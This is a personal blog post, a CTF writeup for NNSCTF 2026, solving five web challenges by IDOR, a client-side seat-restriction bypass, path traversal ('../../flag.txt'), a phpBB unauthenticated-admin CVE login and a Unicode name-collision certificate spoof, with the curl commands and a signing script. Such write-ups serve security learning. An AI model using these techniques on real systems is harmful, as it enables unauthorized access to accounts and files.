@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NNSCTF 2026 Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<script src="../includes.js" defer></script>
+</head>
+<body>
+
+<site-nav base=".."></site-nav>
+
+<article class="post-article">
+  <a href="index.html" class="back-link">← Back to writing</a>
+  <span class="post-date">2026</span>
+  <h1>Writeup NNSCTF 2026</h1>
+
+  <img src="images/nnsctf-2026/S-1.png" alt="NNSCTF 2026 scoreboard summary">
+  <p>I solved 5 challenges in this CTF event.</p>
+
+  <h2>Web Hacker 2</h2>
+  <blockquote>
+    <p>Desc: Never hacked a website before? Start here.</p>
+  </blockquote>
+
+  <p>This is a warmup challenge:</p>
+  <img src="images/nnsctf-2026/C-1-1.png" alt="Web Hacker 2 challenge page">
+  <p>Here the web tells that i can change the parameter of <code>page</code> from 1 to 2.</p>
+  <img src="images/nnsctf-2026/C-1-2.png" alt="Page 2 showing additional info">
+  <p>Checking <code>page=2</code> it gives another info on how to solve the challenge. It also gives hint on <code>admin</code> user for the actual challenge. Next is clicking <code>Go to challenge</code>:</p>
+  <img src="images/nnsctf-2026/C-1-3.png" alt="Boarding pass page for user john">
+
+  <p>Here there is a boarding pass on the web, for the passenger <code>DOE/JOHN</code>. Checking the page source reveals a script:</p>
+
+  <div class="code-embed">
+<textarea>
+<script>
+  // You are signed in as john.
+  const username = 'john';
+
+  fetch('/api/boarding-pass/' + username).then((a) => {
+    a.json().then((b) => {
+      document.querySelector('#flightnr').textContent = `NNS ${b.route}`;
+      document.querySelector('#trip_readable').textContent = `${b.fromName} to ${b.toName}`;
+      document.querySelector('#trip_code').textContent = `${b.fromCode} → ${b.toCode}`;
+      document.querySelector('#gate').textContent = `${b.gate}`;
+      document.querySelector('#boarding').textContent = `${b.boarding}`;
+      document.querySelector('#departure').textContent = `${b.departure}`;
+      document.querySelector('#passenger').textContent = `${b.passenger}`;
+      document.querySelector('#group_seat').textContent = `${b.group} / ${b.seat}`;
+      document.querySelector('#qr').src = b.qrCode;
+
+      // Fake loading time has been shown in studies to improve customer satisfaction
+      setTimeout(() => {
+        document.querySelector('#loading').classList.add('hidden');
+      }, 500);
+    });
+  });
+</script>
+</textarea>
+  </div>
+
+  <p>The boarding pass is fetch from <code>/api/boarding-pass/&lt;username&gt;</code>. So to get other user, i can change the request of the api to <code>admin</code>.</p>
+
+  <pre><code>$ curl https://web-hacker2-0f0d94a25ef6.chall.nnsc.tf/api/boarding-pass/admin | jq
+{
+ "id": "01a07a1d-de60-7000-bd28-266c5fa574b3",
+ "username": "admin",
+ "qrCode": "data:image/png;base64,iVBORw0KGgoAAAA...",
+ "route": 1337,
+ "fromName": "Stavanger",
+ "fromCode": "ENZV",
+ "toName": "NNS{Y0u_aR3_NoW_1337_HaCKeR_1Nd3eD}",
+ "toCode": "FLAG",
+ "gate": "B2",
+ "boarding": "12:00",
+ "departure": "12:20",
+ "passenger": "FLAG/ADMIN",
+ "group": "0",
+ "seat": "1A"
+}</code></pre>
+
+  <p>The flag is inside the <code>toName</code> field.</p>
+  <p><strong>Flag:</strong> <code>NNS{Y0u_aR3_NoW_1337_HaCKeR_1Nd3eD}</code></p>
+
+  <h2>Simon</h2>
+  <blockquote>
+    <p>Desc: You are Simon. Simon must select the optimal seat for his upcoming flight!</p>
+  </blockquote>
+
+  <img src="images/nnsctf-2026/C-2-1.png" alt="Simon seat selection challenge">
+  <p>This is a web challenge where i have to choose a seat flight. The bottom part (blue seats) can be clicked and saved.</p>
+  <img src="images/nnsctf-2026/C-2-2.png" alt="Save button enabled for blue seat">
+  <p>The <code>Save</code> button is green. And the seat changes. But when choosing the upper part (golden seats), the <code>Save</code> button can't be clicked.</p>
+  <img src="images/nnsctf-2026/C-2-3.png" alt="Save button disabled for golden seat">
+
+  <p>When checking the source code on how the <code>Save</code> button works, i found this:</p>
+
+  <pre><code>saveBtn.addEventListener('click', async () => {
+    const res = await fetch('/save', {
+      method: 'POST',
+      body: JSON.stringify({
+        seat: selectedSeat,
+      }),
+    });
+    const d = await res.json();
+
+    if (!d.ok) {
+      alert(d.error);
+    } else {
+      saveBtn.disabled = true;
+
+      if (d.flag) {
+        location.reload();
+      }
+    }
+  });</code></pre>
+
+  <p>So when the <code>Save</code> button is clicked, it does a POST request to <code>/save</code> with the body <code>seat</code>. To select a seat on the upper part, i use the Burp Suite Repeater to send a POST request with the seat <code>3C</code>.</p>
+  <img src="images/nnsctf-2026/C-2-4.png" alt="Burp Suite Repeater request for seat 3C">
+  <p>It returns <code>"flag":"true"</code> at the response. And when i checked the web back, the flag is there:</p>
+  <img src="images/nnsctf-2026/C-2-5.png" alt="Flag revealed on the seat selection page">
+  <p><strong>Flag:</strong> <code>NNS{we_wi5h_y0u_4_p1e4sant_fl1gHt_W1th_nNs_air}</code></p>
+
+  <h2>NNS Travel</h2>
+  <blockquote>
+    <p>Desc: NNS Air has launched a brand new travel agency: NNS Air Travel Agency. Now you just need to find the tickets they ordered for you.</p>
+    <p>The flag is located at <code>/flag.txt</code>.</p>
+  </blockquote>
+
+  <img src="images/nnsctf-2026/C-3-1.png" alt="NNS Travel booking reference page">
+  <p>The challenge also provided source code, so i can read it from there to get the path. The web has this adding Booking Reference feature with this code:</p>
+
+  <pre><code>'/get-file': {
+  POST: async (req) => {
+    const url = new URL(req.url);
+    const ticket = url.searchParams.get('pnr');
+
+    const f = Bun.file('./tickets/' + ticket);
+    try {
+      return new Response(await f.text(), {
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+    } catch (e) {
+      return Response.json(
+        {
+          ok: false,
+          error: 'Ticket not found.',
+        },
+        { status: 404 },
+      );
+    }
+  },
+},</code></pre>
+
+  <p>Here it does POST request to <code>/get-file</code> with the parameter <code>pnr</code> and find the files inside <code>./tickets/</code> directory. But the parameter isn't sanitized correctly and is immediately appended to <code>./tickets/</code> to find the file. This means the POST request has Path Traversal vulnerability to access the flag. Because the tickets are stored in <code>./tickets/*</code>, so i need to go up twice to get to <code>/</code> and read the flag.txt</p>
+
+  <pre><code>$ curl -X POST https://nns-travel-6811b345519c.chall.nnsc.tf/get-file?pnr=../../flag.txt
+NNS{Wh00Ps_YoU_F0UNd_a_pa7H_7r4VeRs4l_in_my_CoDe}</code></pre>
+
+  <p><strong>Flag:</strong> <code>NNS{Wh00Ps_YoU_F0UNd_a_pa7H_7r4VeRs4l_in_my_CoDe}</code></p>
+
+  <h2>PHP is my passion</h2>
+  <blockquote>
+    <p>Desc: I run a phpBB forum, but it's a bit outdated. Maybe there's a well-known vulnerability that can be exploited?</p>
+  </blockquote>
+
+  <p>This is a challenge that utilizes CVE to solve.</p>
+  <img src="images/nnsctf-2026/C-4-1.png" alt="phpBB forum login page">
+  <p>The web is running phpBB running version 3.3.16 (this can be found in the source code inside Dockerfile)
+  <code>curl -fsSL -o /tmp/phpbb.zip https://download.phpbb.com/pub/release/3.3/3.3.16/phpBB-3.3.16.zip; \</code></p>
+
+  <p>This phpBB version has the <a href="https://www.ionix.io/threat-center/cve-2026-48611/">CVE-2026-48611</a> which allows unauthenticated administrator account login. After finding some POC of the CVE, i found <a href="https://github.com/wanmywan/CVE-2026-48611-phpBB">this github</a>.</p>
+
+  <p>So the exploit is doing a POST to <code>ucp.php?mode=login_link&amp;auth_provider=apache&amp;login_link_x=1</code>, and use the provided cookie to become admin in the web.</p>
+  <img src="images/nnsctf-2026/C-4-2.png" alt="Burp Suite Repeater showing successful admin login">
+  <p>Here is the example using Burp Suite Repeater of successful login as admin. After login, the web should look like this:</p>
+  <img src="images/nnsctf-2026/C-4-3.png" alt="phpBB admin dashboard after login">
+
+  <p>The flag is stored inside Private Message of admin as stated in the source code:</p>
+
+  <pre><code>$stmt = $db->prepare('INSERT INTO phpbb_privmsgs (author_id, message_time, message_subject, message_text, to_address) VALUES (2, :t, :s, :m, :a)');
+$stmt->bindValue(':t', $now, SQLITE3_INTEGER);
+$stmt->bindValue(':s', 'note to self');
+$stmt->bindValue(':m', $flag);
+$stmt->bindValue(':a', 'u_2');
+$stmt->execute();</code></pre>
+
+  <p>Clicking the Private Message would return the private message list:</p>
+  <img src="images/nnsctf-2026/C-4-4.png" alt="Private message list for admin">
+
+  <p>Here to view that <code>note to self</code> i can do a GET request on <code>&lt;a href="./ucp.php?i=pm&amp;mode=view&amp;f=0&amp;p=1" class="topictitle"&gt;</code></p>
+
+  <img src="images/nnsctf-2026/C-4-5.png" alt="Flag revealed inside the private message">
+  <p><strong>Flag:</strong> <code>NNS{pHp_15_mY_pass1oN_anD_s0_aRe_aP4che_aUth_proVideR5}</code></p>
+
+  <p><em>Note: (Looks like the cookie is like one time use on requests, so everytime i do a request, i need to re-get a new cookie from the <code>ucp.php</code> POST request.)</em></p>
+
+  <h2>ASS</h2>
+  <blockquote>
+    <p>Desc: Everything should be self-serve in 2026</p>
+  </blockquote>
+
+  <p>This challenge is a website that can generate a self-signed certificate for users.</p>
+  <img src="images/nnsctf-2026/C-5-1.png" alt="ASS certificate generator page">
+  <p>From the source code provided, i can create an <code>ADMIN</code> or <code>CLIENT</code> profile certificate and assign a name to it.</p>
+
+  <pre><code>@app.post(
+    "/certificates",
+    response_model=CertificateResponse,
+    response_model_exclude_none=True,
+)
+def provision(request: CertificateRequest) -> CertificateResponse:
+    global administrator
+
+    if not names.is_acceptable(request.name):
+        raise HTTPException(status_code=400, detail="invalid name")
+
+    with lock:
+        if request.name in issued_names:
+            raise HTTPException(status_code=409, detail="name already in use")
+        if request.profile == "ADMIN" and administrator is not None:
+            raise HTTPException(
+                status_code=409,
+                detail="an administrator certificate has already been provisioned",
+            )
+
+        certificate, key = authority.issue(request.name)
+        try:
+            _ = ca.subject(certificate).hashable
+        except ValueError:
+            raise HTTPException(status_code=400, detail="invalid name") from None
+
+        issued_names.add(request.name)
+        if request.profile == "ADMIN":
+            administrator = certificate
+
+    return CertificateResponse(
+        profile=request.profile,
+        name=request.name,
+        certificate=ca.certificate_pem(certificate),
+        private_key=None if request.profile == "ADMIN" else ca.private_key_pem(key),
+    )</code></pre>
+
+  <p>The names checker are defined in <code>names.py</code>:</p>
+
+  <pre><code>MIN_LENGTH = 4
+MAX_LENGTH = 16
+
+LATIN_EXTENDED_ADDITIONAL = range(0x1E00, 0x1F00)
+
+
+def in_repertoire(character: str) -> bool:
+    return "A" <= character <= "Z" or ord(character) in LATIN_EXTENDED_ADDITIONAL
+
+
+def is_acceptable(name: str) -> bool:
+    return (
+        MIN_LENGTH <= len(name) <= MAX_LENGTH
+        and all(in_repertoire(character) for character in name)
+        and name.isalpha()
+        and name.isupper()
+    )</code></pre>
+
+  <p>The server accepts names that are alphanumeric and some latin characters. Now to get the flag, i need to send POST request to <code>/admin</code> with some conditions:</p>
+
+  <pre><code>@app.post("/admin", response_model=AdminResponse)
+def administration(request: AdminRequest) -> AdminResponse:
+    with lock:
+        administrator_certificate = administrator
+    if administrator_certificate is None:
+        raise HTTPException(
+            status_code=409, detail="no administrator certificate has been provisioned"
+        )
+
+    if len(request.certificate) > MAX_CERTIFICATE_PEM:
+        raise HTTPException(status_code=400, detail="certificate too large")
+    try:
+        presented = x509.load_pem_x509_certificate(request.certificate.encode())
+    except ValueError:
+        raise HTTPException(status_code=400, detail="malformed certificate") from None
+    try:
+        signature = base64.b64decode(request.signature, validate=True)
+    except (binascii.Error, ValueError):
+        raise HTTPException(status_code=400, detail="malformed signature") from None
+
+    if not consume_nonce(request.nonce):
+        raise HTTPException(status_code=401, detail="unknown or expired nonce")
+    if not authority.issued_by_us(presented):
+        raise HTTPException(
+            status_code=401, detail="certificate was not issued by this authority"
+        )
+    if not ca.is_in_validity_period(presented):
+        raise HTTPException(
+            status_code=401, detail="certificate is not valid at this time"
+        )
+
+    public_key = presented.public_key()
+    if not isinstance(public_key, ed25519.Ed25519PublicKey):
+        raise HTTPException(status_code=401, detail="unsupported certificate key type")
+    try:
+        public_key.verify(signature, request.nonce.encode())
+    except InvalidSignature:
+        raise HTTPException(
+            status_code=401, detail="signature does not verify"
+        ) from None
+
+    try:
+        authorized = ca.subject(presented) == ca.subject(administrator_certificate)
+    except ValueError:
+        raise HTTPException(status_code=400, detail="malformed certificate") from None
+    if not authorized:
+        raise HTTPException(status_code=403, detail="not the administrator")
+
+    return AdminResponse(flag=FLAG)</code></pre>
+
+  <p>It verifies the certificate, signature, and nonce in the request body and checks if all of those meet the requirements.</p>
+
+  <p>Now to get the certificate, i can send a name to <code>/certificate</code>, get the private key, sign the nonce with the private key, and post those to <code>/admin</code>. But if the issued certificate has the <code>ADMIN</code> profile, the private key isn't provided in the response. The vulnerability lies in the latin characters usage, for example <code>ẞ</code> translates to <code>SS</code>. So by creating a similar name, i can sign the nonce with <code>CLIENT</code> profile, and get a signature that has the same name as the <code>ADMIN</code> profile.</p>
+
+  <img src="images/nnsctf-2026/C-5-2.png" alt="ADMIN certificate issued for name ASSASIN">
+  <p>Here i got the certificate for the name <code>ASSASIN</code> as <code>ADMIN</code> profile. Next i can create a <code>CLIENT</code> profile certificate:</p>
+  <img src="images/nnsctf-2026/C-5-3.png" alt="CLIENT certificate issued for name with unicode SS character">
+  <p>Here i got the <code>private_key</code> for the user <code>AẞASIN</code>. Now i need to get the nonce:</p>
+
+  <pre><code>$ curl https://ass-59a5aa23d4c2.chall.nnsc.tf/auth/nonce
+{"nonce":"8d28c156741418826df30159e7aab231a534175a0d9906d6dc70b55a0e1afe05","expires_in":120}</code></pre>
+
+  <p>and sign it with the private key. I use this script to sign it:</p>
+
+  <pre><code>import base64
+from cryptography.hazmat.primitives.serialization import load_pem_private_key
+
+# Your private key
+private_key_pem = "-----BEGIN PRIVATE KEY-----\nMC4CAQAwBQYDK2VwBCIEINTKEwlwJvJrVi/Y5JqGOSQDzTPbqKcril+HA9dcEM2/\n-----END PRIVATE KEY-----\n"
+
+# Load the private key
+private_key = load_pem_private_key(private_key_pem.encode(), password=None)
+
+# nonce
+nonce = "8d28c156741418826df30159e7aab231a534175a0d9906d6dc70b55a0e1afe05"
+
+# Sign the nonce's raw bytes with your private key
+signature_bytes = private_key.sign(nonce.encode())
+
+# Base64-encode the signature for the JSON payload
+signature_b64 = base64.b64encode(signature_bytes).decode()
+
+# Print the signature
+print(signature_b64)</code></pre>
+
+  <pre><code>$ python sign.py
+FHmvHM7do+tOJZkx6VyCAAHBqKsedNnjAsPp0+4c5Lvefd902P9oi/ccUt50TdebI4CFXUAycj0StraZqmlsDg==</code></pre>
+
+  <p>Then using this signature to send POST request to <code>/admin</code>: Using the CLIENT profile user certificate, the new nonce, and the signature got from the python script</p>
+  <img src="images/nnsctf-2026/C-5-4.png" alt="Successful admin request returning the flag">
+
+  <p><strong>Flag:</strong> <code>NNS{rfc_3454_froZe_7He_7aBle_BUt_the_uNiCoD3_k3Pt_Walk1Ng_CRazy_r16Ht}</code></p>
+
+</article>
+
+<site-footer></site-footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
